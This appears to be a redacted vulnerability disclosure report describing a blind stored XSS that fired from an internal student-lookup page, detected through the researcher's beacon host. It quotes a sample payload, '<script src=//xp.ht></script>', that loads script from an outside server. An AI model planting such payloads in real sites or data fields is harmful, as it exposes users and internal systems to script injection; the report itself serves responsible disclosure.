I often use mine `xp.ht` host as a beacon for SSRF/XSS payloads, and today one was triggered from the `https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&&` endpoint (it was found in the Referer header)\n\nThis domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.\n\n##POC\n███████\nSadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.\nThe `GET /?_=1594756841631` indicated that payload is likely reside in HTML source, and was triggered during student lookup (perhaps there is payload  somewhere in the student data containing `<script src=//xp.ht></script>` or similar).\nYou may need to confirm this with system owner first since I don't have enough details to confirm it from my side since vulnerable host is internal.\n\n## Impact\n\nBlind Stored XSS on the internal host.",
